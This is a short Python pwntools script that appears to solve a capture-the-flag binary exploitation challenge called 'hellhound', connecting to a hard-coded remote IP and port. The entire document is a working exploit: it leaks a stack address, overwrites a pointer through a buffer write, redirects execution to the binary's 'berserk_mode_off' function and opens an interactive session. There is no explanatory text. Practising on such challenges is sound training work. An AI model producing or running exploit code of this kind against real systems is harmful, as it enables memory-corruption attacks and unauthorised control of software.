#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./hellhound_patched',checksec=False)
libc = ELF('./hellhound',checksec=False)
ld = ELF('./ld-2.23.so',checksec=False)
#p = process()
p = remote('94.237.62.166',46869)
#gdb.attach(p,gdbscript='''
#           b*main+76
#           b*main+184
#           b*main+140
#           b*0x0000000000400D86
#           b*main+202
#           ''')
input()


p.sendlineafter(b'>> ',b'1')
p.recvuntil(b' [')
leak = int((p.recvuntil(b']')[:-1]).decode())

log.info(f"leak: {hex(leak)}")

p.sendlineafter(b'>> ',b'2')
p.sendafter(b'some code: ',b'a'*8 + p64(leak+0x50))


p.sendlineafter(b'>> ',b'3')

p.sendlineafter(b'>> ',b'2')
p.sendafter(b'some code: ',p64(exe.sym.berserk_mode_off) + p64(0))

p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'>> ',b'69')



p.interactive()
